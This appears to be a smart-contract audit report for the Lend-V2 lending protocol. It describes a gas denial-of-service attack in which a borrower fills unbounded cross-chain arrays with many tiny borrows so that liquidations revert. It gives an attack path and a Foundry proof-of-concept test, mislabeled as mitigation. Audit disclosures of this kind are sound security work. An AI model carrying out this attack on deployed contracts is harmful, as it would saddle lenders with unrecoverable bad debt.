# A malicious or careless borrower will prevent liquidators from ever executing liquidateCrossChain against their position, shielding themselves from liquidation and putting the protocol and its lenders at risk of bad-debt accrual.

### Summary

Unbounded growth of the per-user Borrow[] / Collateral[] arrays will cause out-of-gas reverts for any call that iterates those arrays, leading to an uncollateralised position that cannot be liquidated for the protocol and honest lenders, as a borrower repeatedly opens hundreds of 1-wei cross-chain borrows until the loops exceed the block-gas limit.

### Root Cause

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L215-L220

```solidity
// …later…
for (uint256 i = 0; i < userCrossChainCollaterals.length; ++i) {  // _validateAndPrepareLiquidation
```
addCrossChainCollateral and addCrossChainBorrow append to unbounded
dynamic arrays. Every liquidity‐ or liquidation-related function subsequently
scans the full array with no gas cap. Once the array reaches ~1 500
elements, those scans exceed the 30 M main-net block-gas limit and revert.

### Internal Pre-conditions

1. Borrower performs borrowCrossChain(1 wei, …) at least 1 500 times, creating ≥ 1 500 entries in
crossChainCollaterals[borrower][underlying].

2. No protocol limit blocks the array expansion (owner trusts governance).

### External Pre-conditions

None – the attack does not depend on oracle moves, gas price, or any
third-party protocol.

### Attack Path

1. Borrower supplies a small amount of collateral on Chain A.

2. Borrower calls borrowCrossChain(1 wei, underlyingA, CHAIN_B_ID) in
a loop 1 500+ times, each time paying the tiny LayerZero fee.
Each call appends a new Borrow/Collateral struct.

3. Once array length ≥ 1 500, the borrower lets the position become
under-collateralised (e.g., price drop).

4. Liquidator calls routerB.liquidateCrossChain(…) with a normal
400 k–1 M gas limit.

5. In _validateAndPrepareLiquidation the for-loop over
crossChainCollaterals exceeds the block-gas limit → out-of-gas revert.

6. All subsequent liquidation attempts (and some repay paths) keep reverting.
The borrower’s debt is never repaid; lenders bear the loss.

### Impact

1. Protocol & liquidity providers suffer potentially 100 % loss on the
borrower’s outstanding debt (bad debt remains on the books).

2. Attack cost is only the LayerZero fee for many tiny messages plus ≈90 M
gas to store 1 500 structs—cheap relative to the blocked position’s size.

### PoC

_No response_

### Mitigation

Add this test in the TestBorrowingCrossChain.t.sol
```solidity
function test_liquidation_gas_DOS_with_many_collaterals() public {
    address borrower = deployer;                 // victim account we control
    address liquidator = makeAddr("liquidator"); // someone trying to liquidate
    vm.deal(liquidator, 1 ether);

    // Choose first underlying / lToken on chain B
    address underlyingB = supportedTokensB[0];
    address lTokenToSeize = lTokensB[0];         // collateral market
    address borrowedAsset = supportedTokensB[1]; // assume a different market

    /* ---------- 1. artificially bloat the collateral array ---------- */
    LendStorage.Borrow memory dummy = LendStorage.Borrow({
        srcEid: CHAIN_A_ID,
        destEid: CHAIN_B_ID,
        principle: 1,            // tiny principle
        borrowIndex: 1e18,
        borrowedlToken: lTokenToSeize,
        srcToken: underlyingB
    });

    uint256 N = 1_000;           // #records to insert
    for (uint256 i = 0; i < N; ++i) {
        vm.prank(address(routerB));              // routerB is authorised
        lendStorageB.addCrossChainCollateral(borrower, underlyingB, dummy);
    }
    assertEq(
        lendStorageB.getCrossChainCollaterals(borrower, underlyingB).length,
        N,
        "array successfully bloated"
    );

    /* ---------- 2. attempt liquidation with a normal gas-limit ---------- */
    uint256 GAS_LIMIT = 300_000; // ordinary tx gas, far below the ~20 M needed

    vm.prank(liquidator);
    (bool success,) = address(routerB).call{gas: GAS_LIMIT}(
        abi.encodeCall(
            routerB.liquidateCrossChain,
            (borrower, 1, CHAIN_A_ID, lTokenToSeize, borrowedAsset) // repayAmount = 1
        )
    );

    assertFalse(success, "call should run out of gas and revert");
}
